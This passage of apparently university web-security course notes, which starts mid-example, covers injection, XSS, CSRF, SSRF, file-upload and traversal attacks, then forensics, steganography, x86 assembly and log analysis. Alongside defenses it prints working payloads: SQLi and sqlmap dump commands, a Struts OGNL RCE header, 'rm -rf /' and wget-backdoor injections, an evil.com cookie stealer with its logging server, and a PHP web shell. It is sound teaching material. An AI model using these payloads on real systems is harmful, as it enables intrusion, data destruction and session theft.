SELECT name FROM students WHERE first_name = 'Robert'); DROP TABLE Students;--') AND (active = true)
```

**Result**: Deletes the entire Students table (Bobby Tables attack)

### Advanced SQL Injection Techniques

#### Information Gathering Queries

**Get MySQL Version:**
```sql
5' UNION SELECT 1, @@version#
```

**Get Current User:**
```sql
5' UNION SELECT 1, user()#
```

**Get Database Name:**
```sql
5' UNION SELECT 1, database()#
```

**List All Tables:**
```sql
5' UNION SELECT 1, table_name FROM information_schema.tables#
```

**List Columns in Specific Table:**
```sql
5' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name='users'#
```

### Blind SQL Injection

#### Characteristics
- Attacker cannot directly observe database query results
- Must infer information based on application behavior
- Two types:
  - **Content-based**: Different responses for TRUE/FALSE conditions
  - **Time-based**: Use SLEEP() functions to detect TRUE/FALSE

#### Content-Based Blind SQLi Example
```sql
1' AND substr(password,1,1)="5"#
```
- If response is "User exists" → first character of password is "5"
- If response is "User missing" → first character is not "5"
- Repeat for each character position

#### Time-Based Blind SQLi Example
```sql
1' AND IF(substr(password,1,1)="5", SLEEP(5), 0)#
```
- If response takes 5+ seconds → first character is "5"
- If response is immediate → first character is not "5"

### SQLMap Tool

#### Purpose
- Automated SQL injection detection and exploitation
- Highly automated with minimal effort required

#### Basic Usage
```bash
sqlmap --url="http://target/vulnerable.php?id=1" --cookie="session_cookie"
```

#### Advanced Options
```bash
# Enumerate databases
sqlmap --url="..." --dbs

# Enumerate tables
sqlmap --url="..." --tables

# Dump specific table
sqlmap --url="..." -T users -C user,password --dump

# Use proxy for traffic analysis
sqlmap --url="..." --proxy="http://localhost:8080"
```

---

## Command Injection Attacks

### Overview
- **Similar to SQL injection** but targets OS commands instead of database queries
- **Attack vector**: User input used as part of system commands
- **Impact**: Arbitrary command execution on server

### Example Vulnerable Code
```php
$results = shell_exec("whois " . $user_input);
```

### Attack Examples

#### Basic Command Injection
**Input:** `ua.edu.au; rm -rf /`
**Executed Command:** `whois ua.edu.au; rm -rf /`
**Result:** Deletes all files on server

#### Command Chaining Operators
- `;` - Execute commands sequentially
- `&&` - Execute second command only if first succeeds
- `||` - Execute second command only if first fails
- `&` - Execute commands in parallel

### Real-World Example: Apache Struts RCE

#### Vulnerability Details
- **Target**: Apache Struts framework
- **Vector**: Improperly validated Content-Type HTTP header
- **Exploitation**: Inject OGNL (Object-Graph Navigation Language) code
- **Impact**: Remote code execution on server

#### Attack Example
```http
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

## Defensive Measures

### Input Validation and Sanitization

#### Whitelist Approach (Preferred)
```php
// Only allow valid IP addresses
if (preg_match("/^([0-9]{1,3}\.){3}[0-9]{1,3}$/", $ip)) {
    $cmd = shell_exec('ping -c 4 ' . $ip);
    print("<pre>{$cmd}</pre>");
} else {
    print("Invalid IPv4 format!");
}
```

#### Blacklist Approach (Less Secure)
```php
// Remove dangerous characters (can be bypassed)
$ip = preg_replace("/;/", "", $ip);
```

### SQL Injection Prevention

#### 1. Prepared Statements (Best Practice)
```php
// Vulnerable approach
$sql = "SELECT id, name, grade FROM students WHERE name='" . $username . "' AND password='" . sha1($password) . "'";

// Secure approach with prepared statements
$stmt = $conn->prepare("SELECT id, name, grade FROM students WHERE name = ? AND password = ?");
$stmt->bind_param('ss', $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

#### 2. Input Validation
```php
// Validate input format
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    die("Invalid email format");
}

// Validate numeric input
if (!is_numeric($id)) {
    die("Invalid ID format");
}
```

#### 3. Escape Special Characters
```php
// Escape dangerous characters
$username = mysqli_real_escape_string($connection, $username);
```

#### 4. Use Safe APIs
- **PHP**: PDO (PHP Data Objects) instead of mysqli
- **Java**: PreparedStatement instead of Statement
- **Python**: Parameterized queries in DB-API

### Command Injection Prevention

#### 1. Avoid System Calls
```php
// Instead of shell_exec("ping " . $host)
// Use built-in functions or libraries when possible
```

#### 2. Input Validation
```php
// Only allow alphanumeric characters and dots for hostnames
if (preg_match("/^[a-zA-Z0-9.-]+$/", $hostname)) {
    // Safe to proceed
}
```

#### 3. Use Safe Functions
```php
// Use escapeshellarg() for shell arguments
$safe_arg = escapeshellarg($user_input);
$cmd = shell_exec("ping -c 4 " . $safe_arg);
```

### Client-Side vs Server-Side Validation

#### Client-Side Validation (HTML5)
```html
<input type="text" name="ip" pattern="^([0-9]{1,3}\.){3}[0-9]{1,3}$" title="invalid ip address">
```
**Purpose**: Better user experience
**Security**: Can be easily bypassed (modify HTML in browser)

#### Server-Side Validation (PHP)
```php
if (preg_match("/^([0-9]{1,3}\.){3}[0-9]{1,3}$/", $ip)) {
    // Process valid input
} else {
    // Reject invalid input
}
```
**Purpose**: Security enforcement
**Security**: Cannot be bypassed by client

### Best Practices Summary

1. **Never trust user input**
2. **Use prepared statements** for database queries
3. **Implement proper input validation** (whitelist approach)
4. **Use both client-side and server-side validation**
5. **Escape special characters** when building dynamic queries
6. **Use safe APIs** that handle parameterization automatically
7. **Apply principle of least privilege** to database users
8. **Regular security testing** and code reviews

## Practical Workshop Examples

### Workshop 0x08 Overview

#### Part 1: Command Injection and SQL Injection
#### Part 2: XSS, CSRF (next workshop)

### Setting Up Environment

#### 1. Start Apache2
```bash
sudo systemctl start apache2
sudo systemctl enable apache2
```

#### 2. Enable PHP Error Messages
```bash
sudo sed -i -e '/display_errors =/ s/= .*/= on/' /etc/php/8.1/apache2/php.ini
```

#### 3. Test Environment
- Access: `http://localhost`
- Should see Apache default page

### Command Injection Workshop

#### Vulnerable Ping Server (ping.php)
```php
<html><body>
<h1>Welcome to the Ping Server</h1>
<form method="post">
IP: <input type="text" name="ip">
<input type="submit" name="ping">
</form>
<?php
if(isset($_POST['ping'])) {
    $ip = $_POST['ip'];
    $cmd = shell_exec('ping -c 4 '.$ip); 
    print("<pre>{$cmd}</pre>");
}
?>
</body></html>
```

#### Attack Examples
1. **Basic injection**: `127.0.0.1; ls /`
2. **File reading**: `127.0.0.1; cat /etc/passwd`
3. **Backdoor**: `127.0.0.1; wget https://bad_server/backdoor; backdoor 4444`

#### Client-Side Validation Bypass
1. Add pattern validation:
```html
<input type="text" name="ip" pattern="^([0-9]{1,3}\.){3}[0-9]{1,3}$" title="invalid ip address">
```
2. Bypass: Use F12 developer tools to remove pattern attribute
3. Submit malicious payload

#### Secure Implementation
```php
<?php
if(isset($_POST['ping'])) {
    $ip = $_POST['ip'];
    $ip = preg_replace("/;/","",$ip); // Naive filter (insufficient)
    if (preg_match("/^([0-9]{1,3}\.){3}[0-9]{1,3}$/", $ip)) {
        $cmd = shell_exec('ping -c 4 ' . $ip); 
        print("<pre>{$cmd}</pre>");
    } else {
        print("Invalid IPv4 format!");
    }
}
?>
```

### SQL Injection Workshop

#### Database Setup
1. **Start MySQL**:
```bash
sudo systemctl start mysql
sudo mysql
```

2. **Create Database**:
```sql
CREATE DATABASE workshop8;
GRANT ALL PRIVILEGES ON workshop8.* TO 'dbuser'@'localhost' IDENTIFIED BY 'password123';
```

3. **Create Table**:
```sql
CREATE TABLE students (
    id INT NOT NULL AUTO_INCREMENT,
    name VARCHAR(40) NOT NULL,
    password VARCHAR(40) NOT NULL,
    grade VARCHAR(2) NOT NULL,
    PRIMARY KEY (id)
);
```

4. **Insert Test Data**:
```sql
INSERT INTO students (name, password, grade) VALUES ('Ryoma', sha1('password123'), 'A');
INSERT INTO students (name, password, grade) VALUES ('Kaoru', sha1('pretzels'), 'B');
INSERT INTO students (name, password, grade) VALUES ('Higa', sha1('princeoftennis'), 'F');
```

#### Vulnerable Login System
```php
<?php
session_start();
if (isset($_POST['login'])) {
    $conn = new mysqli("localhost", "dbuser", "password123", "workshop8");
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // VULNERABLE: Direct string concatenation
    $sql = "SELECT id, name, grade FROM students WHERE name='" . $username . "' AND password='" . sha1($password) . "';";
    
    if($res = $conn->query($sql)) {
        if ($res->num_rows > 0) {
            $row = $res->fetch_assoc();
            $_SESSION['id'] = $row['id'];
            $_SESSION['name'] = $row['name'];
            $_SESSION['grade'] = $row['grade'];
        } else {
            echo "Wrong name or password";
        }
    }
}
?>
```

#### SQL Injection Attacks

##### Authentication Bypass
**Input**: `blah' OR 1=1#`
**Result**: Logs in as first user (bypasses password check)

##### Data Extraction with UNION
**Input**: `5' UNION SELECT 1, @@version#`
**Result**: Reveals MySQL version

**Input**: `5' UNION SELECT user, password FROM users#`
**Result**: Extracts all usernames and password hashes

##### LIMIT Manipulation
**Input**: `blah' OR 1=1 LIMIT 1,1#`
**Result**: Logs in as second user instead of first

#### Secure Implementation
```php
<?php
if (isset($_POST['login'])) {
    $username = $_POST['username'];
    $password = sha1($_POST['password']);
    $conn = new mysqli("localhost", "dbuser", "password123", "workshop8");
    
    // SECURE: Using prepared statements
    $stmt = $conn->prepare("SELECT id, name, grade FROM students WHERE name = ? AND password = ?");
    $stmt->bind_param('ss', $username, $password);
    $stmt->execute();
    $result = $stmt->get_result();
    $user = $result->fetch_object();
    
    if ($user) {
        $_SESSION['id'] = $user->id;
        $_SESSION['name'] = $user->name;
        $_SESSION['grade'] = $user->grade;
    } else {
        echo "Wrong name or password";
    }
}
?>
```

This workshop covers advanced web application security vulnerabilities, focusing on practical exploitation techniques and defense mechanisms.

### Key Topics Covered:
- Cross-Site Scripting (XSS) - Reflected vs Stored
- Cross-Site Request Forgery (CSRF)
- Server-Side Request Forgery (SSRF)
- Directory Bursting/Forced Browsing
- File Upload Vulnerabilities
- Local File Inclusion (LFI)

---

## JavaScript Fundamentals

### What is JavaScript?
- **Client-side programming language** that runs in web browsers
- Code is sent by the server as part of HTTP responses
- Used to manipulate web pages (HTML and CSS)
- Makes modern websites interactive
- Supported by all modern web browsers

### JavaScript in Web Pages
JavaScript can be embedded in HTML through several methods:

1. **Direct embedding in `<script>` tags**:
   ```html
   <script>alert("Hello World!")</script>
   ```

2. **External file references**:
   ```html
   <script type="text/JavaScript" src="functions.js"></script>
   ```

3. **Event handler attributes**:
   ```html
   <a href="http://www.yahoo.com" onmouseover="alert('hi');">Link</a>
   ```

4. **Pseudo-URL links**:
   ```html
   <a href="javascript:alert('You clicked');">Click me</a>
   ```

### JavaScript Security Implications
JavaScript can be abused to:
- **Modify webpage content** (HTML/CSS manipulation)
- **Make HTTP requests** to external servers
- **Access browser APIs** and user data
- **Redirect users** to malicious sites

---

## Cross-Site Scripting (XSS)

### Definition
Cross-Site Scripting (XSS) is a vulnerability where attackers inject malicious JavaScript into legitimate websites, which then executes in victims' browsers with the origin of the legitimate website.

### XSS Attack Flow
1. Attacker adds malicious JavaScript to a legitimate website
2. Legitimate website sends the attacker's JavaScript to browsers
3. Attacker's JavaScript runs with the origin of the legitimate website
4. JavaScript can access cookies, sessions, and perform actions as the user

### Types of XSS

#### 1. Reflected XSS (Non-Persistent)
- **Characteristics**:
  - Payload usually in GET/POST parameters
  - Not stored in the application database
  - Requires victim to click malicious link
  - More common but lower risk than Stored XSS

- **Example Scenario**:
  ```php
  // Vulnerable PHP code
  <?php echo "Your query " . $_GET['query'] . " returned $num results.";?>
  ```
  
  **Attack**: `search.php?query=<script>alert(1)</script>`
  
  **Result**: `Your query <script>alert(1)</script> returned 0 results`

- **Attack Steps**:
  1. Attacker sends email with malicious link
  2. Victim clicks link with malicious parameters
  3. Server inserts malicious params into HTML
  4. HTML with injected attack code sent to victim
  5. Victim's browser executes malicious script

#### 2. Stored XSS (Persistent)
- **Characteristics**:
  - Attacker's JavaScript stored on legitimate server
  - Sent to all users who view the infected page
  - Higher risk due to wider impact
  - Classic example: Social media posts, forums, comments

- **Example**: Facebook page with malicious JavaScript in user content
- **Impact**: Anyone loading the attacker's page sees JavaScript with Facebook's origin

### Session Hijacking via XSS

#### Cookie Theft Technique
```javascript
<script>
var img = document.createElement("img");
img.src="http://evil.com/cookiemonster.php?cookie=" + document.cookie;
</script>
```

#### Attack Process:
1. User authenticates to target website (receives session cookie)
2. User visits page with XSS payload (while logged in)
3. Malicious script executes and steals session cookie
4. Cookie sent to attacker's server
5. Attacker uses stolen session to impersonate user

#### Cookie Theft Server (cookiemonster.php):
```php
<?php
if($_REQUEST["cookie"]) { 
    $file = fopen("cookies.txt", "a"); 
    fwrite($file, "Cookie from:" . $_SERVER['REMOTE_ADDR'] . "\n");
    fwrite($file, "Date/time: " . date("F j, Y, g:i a") . " \n");
    fwrite($file, "Cookie: " . $_REQUEST["cookie"] . "\n\n"); 
    fclose($file);
    print("Thank you for the cookie :)\n");
}
?>
```

### XSS Defense Mechanisms

#### 1. HTML Sanitization/Output Encoding
- **Concept**: Convert special characters to HTML entities
- **Implementation**:
  ```php
  // Vulnerable
  echo "Hello " . $_REQUEST["user_input"];
  
  // Secure
  echo "Hello " . htmlspecialchars($_REQUEST["user_input"]);
  ```

- **HTML Entity Encoding**:
  - `&` → `&amp;`
  - `"` → `&quot;`
  - `'` → `&#039;`
  - `<` → `&lt;`
  - `>` → `&gt;`

#### 2. HttpOnly Cookie Flag
- **Purpose**: Prevents client-side scripts from accessing cookies
- **Implementation**: `Set-Cookie: session=xxx; HttpOnly`
- **Result**: `document.cookie` cannot access the cookie

#### 3. Secure Cookie Flag
- **Purpose**: Ensures cookies only sent over HTTPS
- **Implementation**: `Set-Cookie: session=xxx; Secure`

#### 4. Content Security Policy (CSP)
- **Purpose**: Instructs browser to only use resources from specific sources
- **Implementation**: HTTP header specifying policy
- **Benefits**:
  - Disallows inline scripts (prevents inline XSS)
  - Only allows scripts from specified domains
  - Blocks XSS from linking to external scripts

- **Example CSP Header**:
  ```
  Content-Security-Policy: script-src 'self'
  ```

## Cross-Site Request Forgery (CSRF)

### Definition
CSRF is an attack that exploits cookie-based authentication to perform unintended actions as an authenticated user by tricking them into making malicious requests.

### How CSRF Works

#### Prerequisites:
1. User is authenticated to target website (has valid session cookie)
2. Target website uses cookie-based authentication
3. Attacker can trick user into making a request

#### Attack Steps:
1. **User authenticates** to target server (receives session cookie)
2. **Attacker tricks victim** into making malicious request to server
3. **Server accepts request** because valid cookie is automatically attached

### CSRF Attack Examples

#### 1. GET Request via Image Tag
```html
<img src="https://bank.com/transfer?amount=1000&to=attacker">
```
- Image tag automatically makes GET request
- Browser attaches relevant cookies
- Request appears legitimate to server

#### 2. GET Request via Direct Link
```
https://bank.com/transfer?amount=1000&to=attacker
```
- Attacker sends link via email/social media
- User clicks link while authenticated
- Transfer executes using user's session

#### 3. POST Request via JavaScript
```html
<script>
fetch('https://bank.com/transfer', {
    method: 'POST',
    body: 'amount=1000&to=attacker'
});
</script>
```

### CSRF vs Reflected XSS
- **Reflected XSS**: HTTP response contains malicious JavaScript (client-side execution)
- **CSRF**: Malicious HTTP request made with user's cookies (server-side effect)

### CSRF Defense Mechanisms

#### 1. CSRF Tokens
- **Concept**: Include unique, unpredictable token in each form
- **Implementation**:
  ```php
  // Generate token
  $_SESSION['csrf_token'] = md5(uniqid());
  
  // Validate token
  if($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
      die("CSRF token validation failed");
  }
  ```

#### 2. Referrer Validation
- **Concept**: Check `Referer` header to ensure request originates from same site
- **Limitation**: Referrer header is optional and can be spoofed

#### 3. SameSite Cookies
- **Concept**: Controls whether cookies sent with cross-site requests
- **Implementation**: `Set-Cookie: session=xxx; SameSite=strict`
- **Values**:
  - `strict`: Never send cookie with cross-site requests
  - `lax`: Send cookie with top-level navigation
  - `none`: Always send cookie (requires Secure flag)

## Server-Side Request Forgery (SSRF)

### Definition
SSRF occurs when a web application fetches remote resources without validating user-supplied URLs, allowing attackers to make requests to internal systems.

### SSRF Attack Scenarios

#### Basic Example:
```
Normal request: GET /api/v1/fetch?url=https://site.com/image.jpeg
Malicious request: GET /api/v1/fetch?url=https://internal.company.com/admin
```

#### Attack Capabilities:
- **Access internal services** behind firewalls
- **Bypass network access controls**
- **Scan internal network** for services
- **Access cloud metadata services** (AWS, Azure, GCP)

### SSRF Attack Flow:
1. Attacker identifies functionality that fetches remote resources
2. Attacker crafts malicious URL pointing to internal service
3. Server makes request to internal service on attacker's behalf
4. Internal service response returned to attacker

### SSRF Defense Mechanisms

#### Network Layer:
- **Network segmentation** for remote resource access
- **Deny-by-default firewall policies**
- **Block internal IP ranges** (10.0.0.0/8, 192.168.0.0/16, 172.16.0.0/12)

#### Application Layer:
- **Input validation** and sanitization
- **URL whitelist** (positive allow list)
- **Disable HTTP redirections**
- **Don't return raw responses** to clients

---

## Directory Traversal and Forced Browsing

### Directory Traversal (Path Traversal)
- **Definition**: Accessing files outside intended directory using "../" sequences
- **Common Targets**: 
  - `/etc/passwd` (Linux user accounts)
  - `/etc/shadow` (Linux password hashes)
  - `C:\Windows\System32\config\SAM` (Windows password hashes)

#### Attack Payloads:
```
../../../../etc/passwd
/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
../../../../etc/passwd%00
```

### Forced Browsing/Directory Busting
- **Definition**: Attempting to access files/directories not linked from website
- **Tools**:
  - **Dirb**: Command-line directory brute-forcer
  - **Dirbuster**: GUI tool by OWASP
  - **Nikto**: Web vulnerability scanner
  - **Nmap http-enum**: Scripting module
  - **Burp Intruder**: With directory wordlists

#### Common Tools Usage:

**Dirb Example**:
```bash
dirb http://target.com/DVWA
# Uses /usr/share/dirb/wordlists/common.txt (4,612 entries)
```

**Dirbuster Setup**:
- Wordlist: `/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`
- Target: `http://target.com/DVWA`
- Method: GET requests with HEAD detection

---

## File Upload Vulnerabilities

### Unvalidated File Uploads
- **Risk**: Uploading executable files (PHP, JSP, ASPX) that can be executed by server
- **Impact**: Remote code execution, web shell deployment

#### Web Shell Example (PHP):
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if($_GET['cmd']) {
    system($_GET['cmd']);
}
?>
</pre>
</body>
</html>
```

#### Defense Bypass Techniques:
- **Content-Type spoofing**: Change MIME type in request
- **File extension manipulation**: Use double extensions (.php.jpg)
- **Null byte injection**: filename.php%00.jpg

### Local File Inclusion (LFI)
- **Definition**: Including local files on server that shouldn't be directly accessible
- **Common in**: Modular web applications using include/require functions

#### Example Vulnerable Code:
```php
$page = $_GET['page'];
include($page . '.php');
```

#### Attack Examples:
```
page=../../../../etc/passwd
page=....//....//....//etc/passwd
page=/etc/passwd%00
```

---

## BeEF XSS Framework (Optional)

### Browser Exploitation Framework
- **Purpose**: Advanced XSS exploitation and browser attacks
- **Installation**: `sudo apt install beef-xss`
- **Access**: `http://localhost:3000/ui/panel`

#### Hook Injection:
```html
<script src="http://localhost:3000/hook.js"></script>
```

#### Attack Modules:
- **Cookie theft**
- **Screenshot capture**
- **Keylogger**
- **Social engineering attacks**
- **Browser exploitation**

---

## Defense Summary

### General Security Principles

#### Input Validation:
- **Sanitize all user input**
- **Use positive validation** (whitelist approach)
- **Validate on server-side** (never trust client-side validation)

#### Output Encoding:
- **HTML entity encoding** for web content
- **URL encoding** for URL parameters
- **JavaScript encoding** for JavaScript contexts

#### Cookie Security:
```
Set-Cookie: session=xxx; Secure; HttpOnly; SameSite=strict
```

#### Content Security Policy:
```
Content-Security-Policy: script-src 'self'; object-src 'none';
```

### Attack-Specific Defenses

| Attack Type | Primary Defense | Secondary Defense |
|-------------|----------------|-------------------|
| XSS | HTML sanitization | CSP, HttpOnly cookies |
| CSRF | CSRF tokens | SameSite cookies, Referrer validation |

## Digital Forensics and Incident Response (DFIR)

### Definition and Scope
**Digital Forensics and Incident Response (DFIR)** is a field within cybersecurity that focuses on:
- **Identification** of cyberattacks
- **Investigation** of security incidents
- **Remediation** of cybersecurity threats

DFIR has become a central cyber capability for organizations due to the proliferation of endpoints and escalation of cybersecurity attacks.

### Cyber Incident Response Team (CIRT)
- Also known as "Computer Incident Response Team"
- Responsible for responding to:
  - Security breaches
  - Viruses
  - Other potentially catastrophic incidents
- Digital forensics provides necessary information and evidence for the response team

### Forensics Definition
**Forensics**: The application of scientific principles to evidence to test hypotheses or apply other scientific tests in the process of investigation.

*Reference: NIST SP-800-86, Guide to Integrating Forensic Techniques Into Incident Response (Pg. 15)*

### Phases of the Forensics Process (NIST 800-86)

1. **Collection**
   - Gathering relevant digital evidence
   - Preserving chain of custody

2. **Examination**
   - Processing collected data
   - Making data visible and accessible

3. **Analysis**
   - Drawing conclusions from examined data
   - Determining significance of evidence

4. **Reporting**
   - Documenting findings and conclusions
   - Presenting results to stakeholders

## Forensic Areas of Practice

Digital forensics encompasses much more than examining hard drives:

### Core Areas
- **File System Forensics**: Analysis of file systems and storage devices
- **Malware Analysis**: Examining malicious software
- **Memory Forensics**: Analysis of system memory (RAM)
- **Network Forensics**: Investigation of network traffic and communications
- **Cloud Forensics**: Digital investigation in cloud environments
- **Mobile Forensics**: Analysis of mobile devices and applications
- **Log Analysis**: Examination of system and application logs
- **IoT Forensics**: Investigation of Internet of Things devices

---

## Network and File Forensics

### Network Forensics Fundamentals

**Packet Traces vs Network Logs:**
- **Packet traces**: Contain all information being sent across a network, including:
  - Source and destination machines
  - Protocol being used
  - Actual data being sent
- **Network logs**: Records of network events that tell you something happened but don't contain the actual data

### Network Forensics - Capturing Packets

Network traffic is stored in **PCAP files** (Packet capture) using tools like:
- tcpdump
- Wireshark (both based on libpcap)

**Capture Methods:**
1. **Network Tap**: Device placed between two networked devices that captures traffic flowing between them
2. **Port Mirroring**: Sends "copies" of packets flowing through a network switch to a specified location
3. **Wireless Sniffing**: Listens over a wireless network for traffic and captures packets

### Packet Analysis
- Use packet analyzers like **Wireshark** to dive into packets and identify clues
- **Key Challenge**: Packets of interest are usually in an ocean of unrelated traffic
- **Solution**: Analysis triage and filtering the data is crucial

### File Forensics Tools

**Basic Commands:**
```bash
# File format identification
file screenshot.png

# File carving - manually extract sub-section
dd if=./file_with_a_file_in_it.xxx of=./extracted_file.xxx bs=1 skip=1335205 count=40668937

# Search for plaintext within a file
strings -o screenshot.png

# Search for binary/hex/encoded strings
hexdump -n50 -e'"0x%08x "' screenshot.png

# Metadata in image files
exiftool screenshot.png
```

---

## Logs for Digital Forensics

### Types of Logs

1. **System Logs**
   - Capture system events, errors, and activities related to the operating system

2. **Application Logs**
   - Track user activities and errors specific to applications

3. **Security Device Logs**
   - Record events from devices designed to protect the network (firewalls, IDS)

4. **Authentication Logs**
   - Document login attempts and statuses, including successful and failed attempts

5. **Network Device Logs**
   - Include logs from routers and switches detailing system operations and traffic flows

6. **Audit Logs**
   - Keep records of changes made within the system, especially configuration changes

## Steganography and Steganalysis

### Steganography Definition
**Steganography**: The art and science of communicating in a way that hides the existence of a message.

**Key Characteristics:**
- Signal or pattern imposed on content
- Persistent under transmission
- **Not encryption** - original image/file remains intact
- **Not fingerprinting** - doesn't leave separate file describing contents

### Motivation for Steganography

**Legitimate Uses:**
- Industry's desire to protect copyrighted digital work
- Embed author ID or detect counterfeit/unauthorized presentation

**Malicious Uses:**
- Covert way to distribute malware (embed in JPEG files)
- Covert way to exfiltrate data (upload harmless images with embedded data)
- Network steganography

### Types of Steganography

#### Text Steganography
- **Text lines shifted up/down** (40 lines text → 2^40 codes)
- **Word space coding**
- **Character encoding** - minor changes to shapes of characters
- Works only on "images" of text (PDF, PostScript)

#### Image Steganography
Images are popular "cover text" as they tolerate unnoticeable data loss.

**Spatial Domain:**
- **Bit setting (LSB)**: Least Significant Bit modification
- **Color separation**: Using specific color channels

**Frequency Domain:**
- Apply FFT/DCT transform first
- Embed signal in select frequency bands
- Alter least perceptible bits to avoid detection
- **Warning**: These bits are also targeted by lossy compression (JPEG)

### LSB (Least Significant Bit) Steganography

In 24-bit color images:
- Each pixel = 24 RGB bits (8 bits each for Red, Green, Blue)
- LSB method uses the least significant bit of each color channel
- Provides ability to embed approximately 1/8 data size of original image

**Example LSB Encoding:**
```
R = 11011010  →  Value to encode: 11011011 (Hidden Bit 0)
                 11011010 (Hidden Bit 0)
G = 10010110  →  10010111 (Hidden Bit 1)
                 10010110 (Hidden Bit 0)
B = 10010100  →  10010101 (Hidden Bit 1)
                 10010100 (Hidden Bit 0)
```

### Steganalysis
**Steganalysis**: The art of discovering and rendering covert steganography messages.

**Detection Methods:**
- Analysis of carrier file for discernible changes in:
  - File size
  - Statistics
  - Color variations
  - Loss of resolution
  - Other distortions visible to human eye
- Requires knowledge of what the original carrier should look like

## Reverse Engineering

### Definition and Purpose
**Reverse Engineering**: A process where a product, device, system, or software is deconstructed to understand its workings in detail, often with the goal of learning from or improving upon it.

**Applications:**
- **Vulnerability Discovery**: Finding security flaws
- **Malware Analysis**: Understanding malicious software behavior

### Legal Aspects (Australia)
Reverse engineering legality is governed by copyright laws.

**Legal in Australia for:**
- Interoperability purposes
- Error correction
- Security testing - malware, vulnerability analysis and research

**Illegal Activities:**
- Reverse engineering competing products to sell them
- Cracking copy protections
- Distributing cracks/registrations for copyrighted software
- Gaining unauthorized access to any computer

### Learning Reverse Engineering
Similar to learning a new language (assembly), requires understanding:

**Language Elements → Assembly Elements**
- **Vocabulary** → **Instructions**
- **Grammar** → **Addressing Modes/ABI Conventions**
- **Idioms/Expressions** → **Compiler Patterns/Optimizations**

---

## Assembly Language and x86 Architecture

### Assembly Language Basics
- **Lowest-level programming language** readable by humans
- **Intermediary step** between higher-level code (C) and machine code (binary)
- **Nearly 1:1 correspondence** between assembly instructions and processor instructions
- **Multiple architectures**: ARM, MIPS, x86, SPARC, etc.

### x86 (32-bit) Architecture

#### Special Registers
- **EIP (Extended Instruction Pointer)**: Points to the current instruction
- **ESP (Extended Stack Pointer)**: Points to the "bottom" of stack
- **EBP (Extended Base Pointer)**: Points 4 bytes below the return pointer, used for referencing address of the previous frame

#### Intel vs AT&T Syntax

**Intel Syntax** (used in this course):
```assembly
mov eax, 0xca                    ; <instruction> <destination>, <operand(s)>
add DWORD PTR [ebp+0x8], 0x5     ; SIZE PTR [addr + offset] for value at address
```

**AT&T Syntax:**
```assembly
movl $0xca, %eax                 ; <instruction> <operand(s)>, <destination>
addl $0x5, -0x8(%ebp)           ; $ for immediate, % for registers, -offset(addr)
```

### Important x86 Instructions

#### Mathematical Instructions
```assembly
add eax, 0x5        ; Add 0x5 to eax
sub eax, 0x5        ; Subtract 0x5 from eax
mul eax, edx        ; Multiplication - lower 32 bits in EAX, upper 32 bits in EDX
div eax, edx        ; Division - quotient in eax, remainder in edx
```

#### Comparison/Assignment Instructions
```assembly
cmp eax, 0x10                ; Compare - subtracts 0x10 from eax, sets flags
mov eax, edx                 ; Move contents of edx into eax
mov eax, DWORD PTR [edx]     ; Move value at memory location edx into eax
lea eax, [ebx+4*edx]         ; Load effective address - gets pointer to address
```

#### Calling/Conditional Instructions
```assembly
call 0x8004bc       ; Push return address onto stack, call function
ret                 ; Pop return address and jump to it
jmp 0x8004bc        ; Unconditional jump
jl, jle, jge, jg, je ; Conditional jumps (less, less/equal, greater/equal, greater, equal)
```

### Function Prologue and Epilogue

**Standard Prologue:**
```assembly
lea ecx, [esp+0x4]          ; Load address of esp+4 into ecx
and esp, 0xfffffff0         ; Align stack frame to 16-byte boundary
push DWORD PTR [ecx-0x4]    ; Push previous esp onto stack
push ebp                    ; Save previous frame base pointer
mov ebp, esp                ; Set new frame base pointer
push ecx                    ; Save ecx
sub esp, 0x14               ; Allocate 20 bytes for local storage
```

**Value Assignment**

**Standard Epilogue:**
```assembly
mov ecx, DWORD PTR [ebp-0x4]    ; Restore saved values
leave                           ; Restore previous frame
lea esp, [ecx-0x4]             ; Restore original esp
ret                            ; Return to caller
```

# 0x0B Security Engineering Management and Frameworks

## Includes Log Analysis & SIEM Exploration Using Splunk
### Manual Log Analysis

#### Overview
- **Blue Team**: Operational security team proactively looking for signs of attacks and intrusions
- Traditional approach: Using syslog logs with grep/sed/awk commands
- Problems: Time-consuming as log sizes grow to gigabytes/terabytes
- Modern approach: Use SIEM (Security Information and Event Management System)

#### Apache Log Analysis
**Apache Combined Log Format:**
```
%h %l %u %t "%r" %>s %b "%{Referer}i" "%{User-agent}i"
```

**Field Definitions:**
- `%h` = IP address of client (remote host)
- `%l` = RFC 1413 identity of client
- `%u` = userid of person requesting document
- `%t` = Time server finished processing request
- `%r` = Request line from client in double quotes
- `%>s` = Status code server sends back to client
- `%b` = Size of object returned to client

**Example Commands:**
```bash
# View User Agent statistics
awk -F\" '{print $6}' access.log | uniq -c | sort -nr | head -n 10

# Find IP addresses using dirbuster
grep -i "dirbuster" /var/log/apache2/access.log | awk '{print $1}' | uniq -c

# Check response codes for dirbuster scans
grep -i "dirbuster" /var/log/apache2/access.log | awk '{print $9}' | uniq -c
```

### SIEM Systems

#### What is a SIEM?
- **Definition**: Security Information and Event Management System
- **Examples**: Splunk, Logstash, Huntsman
- **Function**: Create Google-style indexes for fast multi-source searches
- **Benefit**: Vastly speed up complex queries across large datasets

#### Splunk Basics
- **Description**: "Google for machine logs"
